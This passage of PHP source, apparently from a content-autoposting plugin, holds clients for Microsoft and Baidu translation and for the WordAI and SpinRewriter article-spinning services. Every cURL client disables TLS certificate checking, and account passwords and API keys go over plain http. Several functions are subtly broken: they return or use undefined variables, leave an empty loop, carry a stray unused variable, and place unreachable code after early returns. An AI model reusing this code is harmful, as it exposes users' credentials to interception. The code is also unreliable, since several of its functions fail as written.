        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, False);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        if ($postData) {
            curl_setopt($ch, CURLOPT_POST, TRUE);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        }
        $curlResponse     = curl_exec($ch);
        $curlErrno = curl_errno($ch);
        if ($curlErrno) {
            $curlError = curl_error($ch);
            throw new Exception($curlError);
        }
        curl_close($ch);
        return $curlResponse;
    }
    function createReqXML($fromLanguage, $toLanguage, $contentType, $inputStrArr)
    {
        $requestXml = "<TranslateArrayRequest>" . "<AppId/>" . "<From>$fromLanguage</From>" . "<Options>" . "<Category xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<ContentType xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\">$contentType</ContentType>" . "<ReservedFlags xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<State xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<Uri xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<User xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "</Options>" . "<Texts>";
        foreach ($inputStrArr as $inputStr)
            $requestXml .= "<string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"><![CDATA[$inputStr]]></string>";
        $requestXml .= "</Texts>" . "<To>$toLanguage</To>" . "</TranslateArrayRequest>";
        return $requestXml;
    }
    public static function translate($token, $src_text, $fromLanguage, $toLanguage, $contentType = 'text/html')
    {
        try {
            $authHeader   = "Authorization: Bearer " . $token;
            $category = "general";
            $params = "text=" . urlencode($src_text) . "&to=" . $toLanguage . "&from=" . $fromLanguage . "&contentType=" . $contentType;
            $translateUrl    = "http://api.microsofttranslator.com/v2/Http.svc/Translate?$params";
            $curlResponse  = self::curlRequest($translateUrl, $authHeader);
            $xmlObj = simplexml_load_string($curlResponse);
            foreach ((array) $xmlObj[0] as $val) {
            }
            return $translated;
        }
        catch (Exception $e) {
            $translated["err"] = "Exception: " . $e->getMessage();
            return $translated;
        }
    }
    public static function translateArray($token, $textArray, $fromLanguage, $toLanguage, $contentType = 'text/html')
    {
        try {
            $translated                = array();
            $translatedStr    = "Authorization: Bearer " . $token;
            $translateUrl   = "http://api.microsofttranslator.com/V2/Http.svc/TranslateArray";
            $requestXml   = self::createReqXML($fromLanguage, $toLanguage, $contentType, $textArray);
            $curlResponse    = self::curlRequest($translateUrl, $authHeader, $requestXml);
            $xmlObj = simplexml_load_string($curlResponse);
            if ($xmlObj->TranslateArrayResponse != null) {
                foreach ($xmlObj->TranslateArrayResponse as $translatedArrObj) {
                    $translated[] = $translatedArrObj->TranslatedText;
                }
            }
            return $translated;
        }
        catch (Exception $e) {
            $translated = array();
            $translated["err"]            = "Exception: " . $e->getMessage();
            return $translated;
        }
    }
}
class autopostWordAi
{
    static function getAccountInfo($email, $pass)
    {
        if (isset($email) && isset($pass)) {
            $ch = curl_init("http://wordai.com/users/account-api.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$email&pass=$pass");
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;
        } else {
            return "Error: Not All Variables Set!";
        }
    }
    static function getSpinText($email, $pass, $type, $text, $quality, $nonested = null, $sentence = null, $paragraph = null)
    {
        if ($type == 1) {
            $api_url = "http://wordai.com/users/regular-api.php";
        } else {
            $api_url = "http://wordai.com/users/turing-api.php";
        }
        if (isset($text) && isset($quality) && isset($email) && isset($pass)) {
            $text             = urlencode($text);
            $ch             = curl_init($api_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            $postFields = "s=$text&quality=$quality&email=$email&pass=$pass&output=json&returnspin=true";
            if ($nonested == "on") {
                $postFields .= "&nonested=on";
            }
            if ($sentence == "on") {
                $postFields .= "&sentence=on";
            }
            if ($paragraph == "on") {
                $rsnhprc = "postFields";
                $postFields .= "&paragraph=on";
            }
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;
        } else {
            return "Error: Not All Variables Set!";
        }
    }
}
function getSpinRewriterSpinText($s, $email, $key, $AutoSentences, $AutoParagraphs, $AutoNewParagraphs, $AutoSentenceTrees, $ConfidenceLevel, $NestedSpintax, $AutoProtectedTerms, $protected_terms = null)
{
    $spinrewriter_api = new autopostSpinRewriter($email, $key);
    if ($protected_terms != null) {
        $spinrewriter_api->setProtectedTerms($protected_terms);
    }
    if ($AutoSentences == 1) {
        $spinrewriter_api->setAutoSentences(true);
    } else {
        $spinrewriter_api->setAutoSentences(false);
    }
    if ($AutoParagraphs == 1) {
        $spinrewriter_api->setAutoParagraphs(true);
    } else {
        $spinrewriter_api->setAutoParagraphs(false);
    }
    if ($AutoNewParagraphs == 1) {
        $spinrewriter_api->setAutoNewParagraphs(true);
    } else {
        $spinrewriter_api->setAutoNewParagraphs(false);
    }
    if ($AutoSentenceTrees == 1) {
        $spinrewriter_api->setAutoSentenceTrees(true);
    } else {
        $spinrewriter_api->setAutoSentenceTrees(false);
    }
    $spinrewriter_api->setConfidenceLevel($ConfidenceLevel);
    if ($NestedSpintax == 1) {
        $spinrewriter_api->setNestedSpintax(true);
    } else {
        $spinrewriter_api->setNestedSpintax(false);
    }
    if ($AutoProtectedTerms == 1) {
        $spinrewriter_api->setAutoProtectedTerms(true);
    } else {
        $spinrewriter_api->setAutoProtectedTerms(false);
    }
    return $spinrewriter_api->getUniqueVariation($s);
}
class autopostSpinRewriter
{
    var $data;
    var $response;
    var $api_url;
    function autopostSpinRewriter($email_address, $api_key)
    {
        $this->data                  = array();
        $this->data["email_address"] = $email_address;
        $this->data["api_key"]       = $api_key;
        $this->api_url               = "http://www.spinrewriter.com/action/api";
    }
    function getQuota()
    {
        $this->data["action"] = "api_quota";
        $this->makeRequest();
        return $this->parseResponse();
    }
    function getTextWithSpintax($text)
    {
        $this->data["action"] = "text_with_spintax";
        $this->data["text"]   = $text;
        $this->makeRequest();
        return $this->parseResponse();
    }
    function getUniqueVariation($text)
    {
        $this->data["action"] = "unique_variation";
        $this->data["text"]   = $text;
        $this->makeRequest();
        return $this->parseResponse();
    }
    function getUniqueVariationFromSpintax($text)
    {
        $this->data["action"] = "unique_variation_from_spintax";
        $this->data["text"]   = $text;
        $this->makeRequest();
        return $this->parseResponse();
    }
    function setProtectedTerms($protected_terms)
    {
        $this->data["protected_terms"] = "";
        if (strpos($protected_terms, "\n") !== false || (strpos($protected_terms, ",") === false && !is_array($protected_terms))) {
            $protected_terms = trim($protected_terms);
            if (strlen($protected_terms) > 0) {
                $this->data["protected_terms"] = $protected_terms;
                return true;
            } else {
                return false;
            }
        } else if (strpos($protected_terms, ",") !== false && !is_array($protected_terms)) {
            $protected_terms_explode = explode(",", $protected_terms);
            foreach ($protected_terms_explode as $protected_term) {
                $protected_term = trim($protected_term);
                if ($protected_term) {
                    $this->data["protected_terms"] .= $protected_term . "\n";
                }
                $this->data["protected_terms"] = $this->data["protected_terms"];
            }
            $this->data["protected_terms"] = trim($this->data["protected_terms"]);
            return true;
        } else if (is_array($protected_terms)) {
            $protected_terms_explode = explode(",", $protected_terms);
            foreach ($protected_terms_explode as $protected_term) {
                $protected_term = trim($protected_term);
                if ($protected_term) {
                    $this->data["protected_terms"] .= $protected_term . "\n";
                }
                $this->data["protected_terms"] = $this->data["protected_terms"];
            }
            $this->data["protected_terms"] = trim($this->data["protected_terms"]);
            return true;
        } else {
            return false;
        }
    }
    function setAutoProtectedTerms($auto_protected_terms)
    {
        if ($auto_protected_terms == "true" || $auto_protected_terms === true) {
            $auto_protected_terms = "true";
        } else {
            $auto_protected_terms = "false";
        }
        $this->data["auto_protected_terms"] = $auto_protected_terms;
        return true;
    }
    function setConfidenceLevel($confidence_level)
    {
        $this->data["confidence_level"] = $confidence_level;
        return true;
    }
    function setNestedSpintax($nested_spintax)
    {
        if ($nested_spintax == "true" || $nested_spintax === true) {
            $nested_spintax = "true";
        } else {
            $nested_spintax = "false";
        }
        $this->data["nested_spintax"] = $nested_spintax;
        return true;
    }
    function setAutoSentences($auto_sentences)
    {
        if ($auto_sentences == "true" || $auto_sentences === true) {
            $auto_sentences = "true";
        } else {
            $auto_sentences = "false";
        }
        $this->data["auto_sentences"] = $auto_sentences;
        return true;
    }
    function setAutoParagraphs($auto_paragraphs)
    {
        if ($auto_paragraphs == "true" || $auto_paragraphs === true) {
            $auto_paragraphs = "true";
        } else {
            $auto_paragraphs = "false";
        }
        $this->data["auto_paragraphs"] = $auto_paragraphs;
        return true;
    }
    function setAutoNewParagraphs($auto_new_paragraphs)
    {
        if ($auto_new_paragraphs == "true" || $auto_new_paragraphs === true) {
            $auto_new_paragraphs = "true";
        } else {
            $auto_new_paragraphs = "false";
        }
        $this->data["auto_new_paragraphs"] = $auto_new_paragraphs;
        return true;
    }
    function setAutoSentenceTrees($auto_sentence_trees)
    {
        if ($auto_sentence_trees == "true" || $auto_sentence_trees === true) {
            $auto_sentence_trees = "true";
        } else {
            $auto_sentence_trees = "false";
        }
        $this->data["auto_sentence_trees"] = $auto_sentence_trees;
        return true;
    }
    function setSpintaxFormat($spintax_format)
    {
        $this->data["spintax_format"] = $spintax_format;
        return true;
    }
    private function parseResponse()
    {
        return json_decode($this->response, true);
    }
    private function makeRequest()
    {
        $data_raw = "";
        foreach ($this->data as $key => $value) {
            $data_raw = $data_raw . $key . "=" . urlencode($value) . "&";
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->api_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data_raw);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $this->response = trim(curl_exec($ch));
        curl_close($ch);
    }
}


class autopostMicrosoftTranslator {
	/*	private static $language_code = array ('ar' => 'Arabic', 'bg' => 'Bulgarian', 'ca' => 'Catalan', 'zh-CHS' => 'Chinese (Simplified)', 'zh-CHT' => 'Chinese (Traditional)', 'cs' => 'Czech', 'da' => 'Danish', 'nl' => 'Dutch', 'en' => 'English', 'et' => 'Estonian', 'fa' => 'Persian (Farsi)', 'fi' => 'Finnish', 'fr' => 'French', 'de' => 'German', 'el' => 'Greek', 'ht' => 'Haitian Creole', 'he' => 'Hebrew', 'hi' => 'Hindi', 'hu' => 'Hungarian', 'id' => 'Indonesian', 'it' => 'Italian', 'ja' => 'Japanese', 'ko' => 'Korean', 'lv' => 'Latvian', 'lt' => 'Lithuanian', 'ms' => 'Malay', 'mww' => 'Hmong Daw', 'no' => 'Norwegian', 'pl' => 'Polish', 'pt' => 'Portuguese', 'ro' => 'Romanian', 'ru' => 'Russian', 'sk' => 'Slovak', 'sl' => 'Slovenian', 'es' => 'Spanish', 'sv' => 'Swedish', 'th' => 'Thai', 'tr' => 'Turkish', 'uk' => 'Ukrainian', 'ur' => 'Urdu', 'vi' => 'Vietnamese');	*/		private static $language_code = array ('ara' => 'Arabic', 'zh' => 'Chinese', 'en' => 'English', 'fra' => 'French', 'de' => 'German', 'it' => 'Italian', 'jp' => 'Japanese', 'kor' => 'Korean', 'pt' => 'Portuguese', 'ru' => 'Russian', 'spa' => 'Spanish', 'th' => 'Thai');
	public static function bulid_lang_options($selected = '') {
		$options = '';
		foreach (self :: $language_code as $key => $value) {
			$options .= '<option value="' . $key . '" ' . (($selected == $key)?'selected="true"':'') . '>' . $value . '</option>';
		} 
		return $options;
	} 
	public static function get_lang_by_code($key) {
		return self :: $language_code[$key];
	} 
	public static function getTokens($clientID, $clientSecret) {		return array('access_token'=>array('clientID'=>$clientID,'clientSecret'=>$clientSecret));
		try {
			$authUrl = "https://datamarket.accesscontrol.windows.net/v2/OAuth2-13/";
			$scopeUrl = "http://api.microsofttranslator.com";
			$grantType = "client_credentials";
			$ch = curl_init();
			$paramArr = array ('grant_type' => $grantType, 'scope' => $scopeUrl, 'client_id' => $clientID, 'client_secret' => $clientSecret);
			$paramArr = http_build_query($paramArr, '', '&');
			curl_setopt($ch, CURLOPT_URL, $authUrl);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $paramArr);
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$strResponse = curl_exec($ch);
			$curlErrno = curl_errno($ch);
			if ($curlErrno) {
				$curlError = curl_error($ch);
				throw new Exception($curlError);
			} 
			curl_close($ch);
			$objResponse = json_decode($strResponse);
			if (@($objResponse -> error)) {
				throw new Exception($objResponse -> error_description);
			} 
			$reValue['access_token'] = $objResponse -> access_token;
			return $reValue;
		} 
		catch (Exception $e) {
			$reValue['err'] = "getTokens() Exception-" . $e -> getMessage();
			return $reValue;
		} 
	} 
	public static function curlRequest($url, $authHeader, $postData = '') {
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_HTTPHEADER, array($authHeader, "Content-Type: text/xml"));
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
		if ($postData) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
		} 
		$curlResponse = curl_exec($ch);
		$curlErrno = curl_errno($ch);
		if ($curlErrno) {
			$curlError = curl_error($ch);
			throw new Exception($curlError);
		} 
		curl_close($ch);
		return $curlResponse;
	} 
	public static function createReqXML($fromLanguage, $toLanguage, $contentType, $inputStrArr) {
		$requestXml = "<TranslateArrayRequest>" . "<AppId/>" . "<From>$fromLanguage</From>" . "<Options>" . "<Category xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<ContentType xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\">$contentType</ContentType>" . "<ReservedFlags xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<State xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<Uri xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "<User xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.MT.Web.Service.V2\" />" . "</Options>" . "<Texts>";
		foreach ($inputStrArr as $inputStr) $requestXml .= "<string xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"><![CDATA[$inputStr]]></string>" ;
		$requestXml .= "</Texts>" . "<To>$toLanguage</To>" . "</TranslateArrayRequest>";
		return $requestXml;
	} 
	public static function translate($token, $src_text, $fromLanguage, $toLanguage, $contentType = 'text/html') {		$strs = autopostBaiduTranslator::translate($src_text, $fromLanguage, $toLanguage, $token['clientID'].'|'.$token['clientSecret']);				if(isset($strs['trans_result'])){			foreach($strs['trans_result'] as $str) {				$translated['str'] .= $str;			}		}				return $translated;
		try {
			$authHeader = "Authorization: Bearer " . $token;
			$category = 'general';
			$params = "text=" . urlencode($src_text) . "&to=" . $toLanguage . "&from=" . $fromLanguage . "&contentType=" . $contentType;
			$translateUrl = "http://api.microsofttranslator.com/v2/Http.svc/Translate?$params";
			$curlResponse = self :: curlRequest($translateUrl, $authHeader);
			$xmlObj = simplexml_load_string($curlResponse);
			foreach((array)$xmlObj[0] as $val) {
				$translatedStr = $val;
			} 
			$translated['str'] = $translatedStr;
			return $translated;
		} 
		catch (Exception $e) {
			$translated['err'] = "Exception: " . $e -> getMessage();
			return $translated;
		} 
	} 
	public static function translateArray($token, $textArray, $fromLanguage, $toLanguage, $contentType = 'text/html') {		$translated = array();		foreach($textArray as $text){			$strs = autopostBaiduTranslator::translate($text, $fromLanguage, $toLanguage, $token['clientID'].'|'.$token['clientSecret']);			if(isset($strs['trans_result'])){				foreach($strs['trans_result'] as $str) {					$translated[] =  $str;				}			}		}		return $translated;
		try {
			$translated = array();
			$authHeader = "Authorization: Bearer " . $token;
			$translateUrl = "http://api.microsofttranslator.com/V2/Http.svc/TranslateArray";
			$requestXml = self :: createReqXML($fromLanguage, $toLanguage, $contentType, $textArray);
			$curlResponse = self :: curlRequest($translateUrl, $authHeader, $requestXml);
			$xmlObj = simplexml_load_string($curlResponse);
			if (@($xmlObj -> TranslateArrayResponse != null)) {
				foreach($xmlObj -> TranslateArrayResponse as $translatedArrObj) {
					$translated[] = $translatedArrObj -> TranslatedText;
				} 
			} 
			return $translated;
		} 
		catch (Exception $e) {
			$translated = array();
			$translated['err'] = "Exception: " . $e -> getMessage();
			return $translated;
		} 
	} 
}

class autopostBaiduTranslator {
	private static $language_code = array ('ara' => 'Arabic', 'zh' => 'Chinese', 'en' => 'English', 'fra' => 'French', 'de' => 'German', 'it' => 'Italian', 'jp' => 'Japanese', 'kor' => 'Korean', 'pt' => 'Portuguese', 'ru' => 'Russian', 'spa' => 'Spanish', 'th' => 'Thai',);
	public static function bulid_lang_options($selected = '') {
		$options = '';
		foreach (self :: $language_code as $key => $value) {
			$options .= '<option value="' . $key . '" ' . (($selected == $key)?'selected="true"':'') . '>' . $value . '</option>';
		} 
		return $options;
	} 
	public static function get_lang_by_code($key) {
		return self :: $language_code[$key];
	} 
	public static function curlRequest($url, $postData = null) {
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);
		if ($postData) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
		} 
		$curlResponse = curl_exec($ch);
		$curlErrno = curl_errno($ch);
		if ($curlErrno) {
			$curlError = curl_error($ch);
			throw new Exception($curlError);
		} 
		curl_close($ch);
		return $curlResponse;
	} 
	public static function translate($src_text, $fromLanguage, $toLanguage, $APIKey, $GET = false) {		
		try {						list($appID,$secKey) = explode('|',$APIKey);            $salt = rand(10000,99999);
			$translateUrl = "http://api.fanyi.baidu.com/api/trans/vip/translate";
			if ($GET) {
				$translateUrl .= '?appid=' . $appID;
				$translateUrl .= '&q=' . urlencode($src_text);
				$translateUrl .= '&from=' . $fromLanguage;
				$translateUrl .= '&to=' . $toLanguage;								$translateUrl .= '&salt=' . $salt;								$translateUrl .= 'sign=' . md5($appID . $src_text . $salt . $secKey);
				$curlResponse = self :: curlRequest($translateUrl);
			} else {
				$postData = array();
				$postData['appid'] = $appID;
				$postData['q'] = $src_text;
				$postData['from'] = $fromLanguage;
				$postData['to'] = $toLanguage;								$postData['salt'] = $salt;								$postData['sign'] = md5($appID . $src_text . $salt . $secKey);
				$curlResponse = self :: curlRequest($translateUrl, $postData);
			} 
			$re = json_decode($curlResponse);
			$translated = array();
			if (isset($re -> error_code)) {
				$translated['err'] = $re -> error_msg . '(' . $re -> error_code . ')';
				switch ($re -> error_code) {
					case '52001': $translated['err'] .= '[Time Out]';
						break;
					case '52002': $translated['err'] .= '[The translator system error, try later]';
						break;
					case '52003': $translated['err'] .= '[Unauthorized, please check your API Key]';
						break;
				} 
			} else {
				$translated['trans_result'] = array();
				foreach($re -> trans_result as $trans_result) {
					$translated['trans_result'][] = $trans_result -> dst;
				} 
			} 
			unset($curlResponse);
			return $translated;
		} 
		catch (Exception $e) {
			$translated['err'] = "Exception: " . $e -> getMessage();
			return $translated;
		} 
	} 
} 